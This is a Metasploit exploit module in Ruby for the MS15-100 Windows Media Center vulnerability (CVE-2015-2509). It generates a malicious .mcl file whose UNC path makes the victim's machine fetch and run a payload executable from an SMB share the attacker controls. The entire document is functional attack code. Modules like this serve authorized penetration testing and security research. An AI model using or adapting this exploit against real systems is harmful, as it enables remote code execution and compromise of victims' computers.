##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::SMB::Server::Share

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS15-100 Microsoft Windows Media Center MCL Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Windows Media Center. By supplying
        an UNC path in the *.mcl file, a remote file will be automatically downloaded,
        which can result in arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r',
        ],
      'References'     =>
        [
          ['CVE', '2015-2509'],
          ['MSB', 'MS15-100']
        ],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => 'false'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Sep 8 2015",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [true, 'The MCL file', 'msf.mcl']),
          OptString.new('FILE_NAME', [ false, 'The name of the malicious payload to execute', 'msf.exe'])
        ], self.class)

      deregister_options('FILE_CONTENTS')
  end

  def generate_mcl
    %Q|<application run="#{unc}" />|
  end

  def primer
    self.file_contents = generate_payload_exe
    print_status("Malicious executable at #{unc}...")

    print_status("Creating '#{datastore['FILENAME']}' file ...")
    mcl = generate_mcl
    file_create(mcl)
  end

end